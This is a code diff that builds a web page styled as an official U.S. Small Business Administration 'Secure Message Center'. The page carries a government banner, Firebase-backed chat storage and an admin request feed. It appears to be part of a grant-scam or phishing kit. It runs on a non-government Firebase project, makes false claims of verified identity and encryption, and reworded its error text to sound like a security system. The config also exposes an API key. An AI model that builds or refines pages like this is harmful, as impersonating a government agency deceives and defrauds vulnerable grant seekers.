@@ -1,9 +1,90 @@
-<script type="module">
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SBA Portal | Secure Message Center</title>
+    <link rel="stylesheet" href="style.css">
+    <style>
+        .msg-bubble {
+            max-width: 85%;
+            padding: 12px;
+            border-radius: 12px;
+            font-size: 13px;
+            line-height: 1.5;
+            position: relative;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+        }
+        .msg-user {
+            align-self: flex-end;
+            background: #1e3a8a; 
+            color: white;
+            border-bottom-right-radius: 2px;
+        }
+        .msg-admin {
+            align-self: flex-start;
+            background: #ffffff;
+            color: #1e293b;
+            border: 1px solid #e2e8f0;
+            border-bottom-left-radius: 2px;
+        }
+        .msg-meta {
+            font-size: 8px;
+            color: #94a3b8;
+            margin-top: 4px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            font-weight: 700;
+        }
+        #chatBox { scroll-behavior: smooth; }
+        #chatBox::-webkit-scrollbar { width: 4px; }
+        #chatBox::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 10px; }
+    </style>
+</head>
+<body style="background: #f1f5f9;">
+
+    <div class="gov-banner">
+        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a4/Flag_of_the_United_States.svg/20px-Flag_of_the_United_States.svg.png" style="width:16px; margin-right:8px;" alt="USA Flag">
+        OFFICIAL U.S. GOVERNMENT SYSTEM - SECURE 2026
+    </div>
+
+    <div class="nav" style="display: flex; justify-content: space-between; align-items: center; padding: 12px 16px; background: #1e3a8a;">
+        <h1 style="margin: 0; font-size: 16px; letter-spacing: 2px; color: white;">SBA.GOV</h1>
+        <button onclick="location.href='dashboard.html'" style="width: auto !important; padding: 6px 15px; background: rgba(255,255,255,0.15); border: 1px solid rgba(255,255,255,0.3); border-radius: 6px; color: white; font-size: 11px; font-weight: 700; cursor: pointer;">
+            BACK
+        </button>
+    </div>
+
+    <div class="container">
+        <div class="card" style="margin-top: 15px; border-radius: 12px; box-shadow: 0 10px 25px -5px rgba(0,0,0,0.1);">
+            <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 15px;">
+                <div style="width: 10px; height: 10px; background: #10b981; border-radius: 50%;"></div>
+                <h2 style="color: #1e3a8a; font-size: 18px; margin: 0;">Secure Support</h2>
+            </div>
+            
+            <p style="font-size: 11px; color: #64748b; margin-bottom: 20px;">Identity verified. Encrypted connection active with SBA Case Management.</p>
+
+            <div id="chatBox" style="background:#f8fafc; border: 1px solid #e2e8f0; padding: 15px; border-radius: 12px; height: 350px; overflow-y: auto; margin-bottom: 15px; display: flex; flex-direction: column; gap: 15px;">
+                </div>
+
+            <textarea id="userMsg" style="height:85px; width: 100%; border-radius: 10px; padding: 12px; border: 1px solid #cbd5e1; font-family: inherit; resize: none; box-sizing: border-box; font-size: 14px;" placeholder="Type your message here..."></textarea>
+            
+            <button id="sendBtn" style="background: #1e3a8a; color: white; padding: 16px; border-radius: 10px; width: 100%; font-weight: 800; border: none; margin-top: 10px; cursor: pointer; text-transform: uppercase; letter-spacing: 1px;">
+                Send Secure Message
+            </button>
+        </div>
+
+        <div style="text-align: center; padding: 10px;">
+            <p style="font-size: 10px; color: #94a3b8; font-family: monospace;">SESSION_ID: 2026-TX-MSG-SECURE</p>
+        </div>
+    </div>
+
+    <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
         import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
         import { getFirestore, collection, addDoc, query, where, onSnapshot, orderBy, serverTimestamp, getDoc, doc } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
 
-        // --- FIREBASE CONFIG (Required for the page to work) ---
+        // Firebase Configuration
         const firebaseConfig = {
             apiKey: "AIzaSyB5nOOx153po4nWh4irbmTAcxsCZaM1-9k",
             authDomain: "sba-grant-2026.firebaseapp.com",
@@ -31,7 +112,7 @@
 
         onAuthStateChanged(auth, (user) => {
             if (user) {
-                // Listen for messages for this specific user
+                // Listen for messages specific to this user
                 const q = query(
                     collection(db, "support_tickets"), 
                     where("userId", "==", user.uid), 
@@ -83,16 +164,16 @@
                 const userSnap = await getDoc(doc(db, "users", user.uid));
                 const userData = userSnap.data() || {};
 
-                // 1. Send to chat record
+                // 1. Add to Support Tickets
                 await addDoc(collection(db, "support_tickets"), {
                     userId: user.uid,
-                    userName: userData.fullName || "User",
+                    userName: userData.fullName || "Valued User",
                     message: text,
                     sender: "USER",
                     timestamp: serverTimestamp()
                 });
 
-                // 2. Alert admin via request stream (This makes it pop up on your admin home)
+                // 2. Alert Admin in Request Feed
                 await addDoc(collection(db, "requests"), {
                     userId: user.uid,
                     userName: userData.fullName || "User",
@@ -106,10 +187,12 @@
                 userMsg.value = "";
             } catch (e) {
                 console.error(e);
-                alert("Connection lost. Please retry.");
+                alert("Security handshake failed. Please check your connection.");
             } finally {
                 sendBtn.disabled = false;
                 sendBtn.innerText = "Send Secure Message";
             }
         };
     </script>
+</body>
+</html>
